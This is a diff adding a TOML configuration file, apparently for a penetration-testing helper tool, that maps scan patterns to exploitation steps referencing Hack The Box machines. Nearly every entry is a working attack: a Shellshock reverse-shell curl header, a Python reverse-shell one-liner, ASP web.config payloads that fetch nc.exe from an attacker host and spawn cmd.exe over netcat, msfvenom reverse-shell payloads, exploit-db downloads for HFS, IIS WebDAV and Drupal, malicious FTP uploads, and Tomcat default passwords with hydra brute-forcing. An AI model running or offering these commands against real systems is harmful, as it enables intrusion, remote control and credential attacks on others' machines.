@@ -1,0 +1,194 @@
+[vulnerable]
+pattern = 'vulnerable'
+description = 'Vulnerability Discovered'
+
+
+[anonymous]
+pattern = 'anonymous'
+description = 'Anonymous User Detected'
+
+
+[ftp_anonymous]
+pattern = "Anonymous FTP"
+description = """Anonymous FTP Enabled!
+    ftp {target_address}
+    # type name, type anonymous
+    # for password, just hit enter, no password needed
+
+    # set transfer type to binary.
+    # this is so I can download and upload files
+    binary
+
+    # download file
+    # get {{some file name}}
+    get issstart.htm
+
+    # upload file
+    # put {{some file name}}
+    put evil.asp
+"""
+
+
+[shellshock]
+pattern = 'cgi-bin'
+description = """Potential Shellshock Vulnerability. (See HTB Shocker)
+\t(1) Scan cgi-bin Folder for any pl,py,sh files
+\t\t'dirsearch -u {scheme}://{target_address}:{port}/cgi-bin -t 16 -r -f -e txt,html,php,asp,aspx,jsp,sh,py,pl -w /usr/share/seclists/Discovery/Web-Content/big.txt',
+\t(2) If File is Found, Use it to run Shellshock. Suppose You Found {scheme}://{target_address}:{port}/cgi-bin/user.sh
+\t\t[option1]:
+\t\t\tOn Attacker:
+\t\t\t"nc -nlvp <Attacker Port>"
+\t\t\t"curl -H 'User-Agent: () {{ :; }}; /bin/bash -i >& /dev/tcp/<Attacker IP>/<Attacker Port> 0>&1' http://{target_address}/cgi-bin/user.sh"
+\t\t[option2]
+\t\t\tOn Attacker:
+\t\t\tDownload exploit here: "wget https://www.exploit-db.com/download/34900 -O shellshock.py"
+\t\t\tRun With: "./shellshock.py payload=reverse rhost={target_address} lhost=<Attacker IP> lport=<Attacker Port> pages=/cgi-bin/user.sh"
+\t\t[option3]
+\t\t\tThis command detects the vulnerability. It can also be used to run commands on Target:
+\t\t\t"nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=ls {target_address}"
+"""
+
+
+[phpbash]
+pattern = 'phpbash'
+description = """Potential Phpbash Vulnerability. (See HTB Bashed)
+\t(1) Explore Suspicious Folders for phpbash.php file
+\t\t-For example, check the dev/ and /php folders
+\t(2) If File is Found, Use it to run PhPBash. Suppose You Found {scheme}://{target_address}:{port}/dev/phpbash.php
+\t\tOn Attacker, Create Netcat Listener:
+\t\t\t"nc -nlvp <Attacker Port>"
+\t\tIn Web Browser at {scheme}://{target_address}/dev/phpbash.php , Connect to Netcat Listener
+\t\t\tpython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<Attacker IP>", <Attacker Port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+"""
+
+
+[hfs23]
+pattern = "hfs 2.3"
+description = """Potential Vulnerability In  HFS 2.3!
+\t) Download exploit
+\t\twget https://www.exploit-db.com/download/39161 -O 39161.py
+
+\t) Change local ip address in script
+
+\t\t) Make netcat available locally on port 80
+\t\tcd priv_esc
+\t\tpweb 80
+\t\t>> now <local ip address>:80/nc.exe downloads netcat
+
+\t) Start  netcat listener
+\t\tnc -nlvp 443
+
+\t) Run with python2
+\t\tpy2 39161.py 10.129.62.239 80
+
+\t***May have to run a couple of times
+"""
+
+
+[drupal]
+pattern = "drupal"
+description = """Potential Drupal Vulnerability!
+\tFor Drupal <= 8.5.0 / <= 8.4.5 / <= 8.3.8 / 7.23 <= 7.57
+\tTry Drupalgeddon2  https://github.com/dreadlocked/Drupalgeddon2/
+
+\t\tsudo gem install highline
+\t\tchmod +x drupalgeddon2.rb
+\t\tmodify the rb file
+\t\t./drupalgeddon2.rb.rb http://10.129.64.241
+"""
+
+
+[webdav]
+pattern = "webdav"
+description = """Potential IIS WebDav Vulnerability!
+\twget https://raw.githubusercontent.com/g0rx/iis6-exploit-2017-CVE-2017-7269/master/iis6%20reverse%20shell -O assay3.py
+
+\t\tThis is based on iis6-exploit-2017-CVE-2017-7269
+\t\tpython2 target_ip target_port reverse_ip reverse_port
+\t\tpyhton2 10.129.2.63 80 10.10.14.158 8080
+
+\t\twait for about 20 seconds
+"""
+
+
+[transfer_aspx]
+pattern = "transfer.aspx"
+description = """Potential ASPX Upload Vulnerability!
+\tMake an aspx file
+\t\tmsfvenom -p windows/x64/shell_reverse_tcp  LHOST=<Attacker IP> LPORT=443 -f exe > shell.exe
+
+\tUpload ASPX File
+<?xml version="1.0" encoding="UTF-8"?>
+<configuration>
+   <system.webServer>
+      <handlers accessPolicy="Read, Script, Write">
+         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\\system32\\inetsrv\\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
+      </handlers>
+      <security>
+         <requestFiltering>
+            <fileExtensions>
+               <remove fileExtension=".config" />
+            </fileExtensions>
+            <hiddenSegments>
+               <remove segment="web.config" />
+            </hiddenSegments>
+         </requestFiltering>
+      </security>
+   </system.webServer>
+</configuration>
+<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
+<%
+Set rs = CreateObject("WScript.Shell")
+Set cmd = rs.Exec("cmd /c whoami")
+o = cmd.StdOut.Readall()
+Response.write(o)
+%>
+-->
+
+\tChange the main command, upload and run...
+1st command:
+    <!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
+    <%
+    Set rs = CreateObject("WScript.Shell")
+    Set cmd = rs.Exec("cmd /c certutil.exe -urlcache -split -f http://<Attacker IP>/nc.exe c:\\windows\\temp\\nc.exe")
+    o = cmd.StdOut.Readall()
+    Response.write(o)
+    %>
+    -->
+
+
+2nd command:
+    <!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
+    <%
+    Set rs = CreateObject("WScript.Shell")
+    Set cmd = rs.Exec("cmd /c c:\\windows\\temp\nc.exe -nv <Attacker IP> 443 -e cmd.exe")
+    o = cmd.StdOut.Readall()
+    Response.write(o)
+    %>
+    -->
+
+experimental command
+    <!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
+    <%
+    Set rs = CreateObject("WScript.Shell")
+    Set cmd = rs.Exec("cmd /c systeminfo")
+    o = cmd.StdOut.Readall()
+    Response.write(o)
+    %>
+    -->
+    >>saw that's 64bit
+"""
+
+[tomcat]
+pattern = "tomcat"
+description = """Potential Tomcat Vulnerability!
+
+\tThese are default Password
+\t\tadmin:admin, tomcat:tomcat, admin:<NOTHING>, admin:s3cr3t, tomcat:s3cr3t, admin:tomcat
+
+\tBrute Force With Hydra
+\t\thydra -L <username list> -P <password list> -f {target_address} -s 8080 http-get <url which prompts for login>
+
+\tBrute Force With Hydra",
+\t\tmsfvenom -p  java/jsp_shell_reverse_tcp LHOST=10.10.14.158 LPORT=443 -f war > exploit2.war
+"""
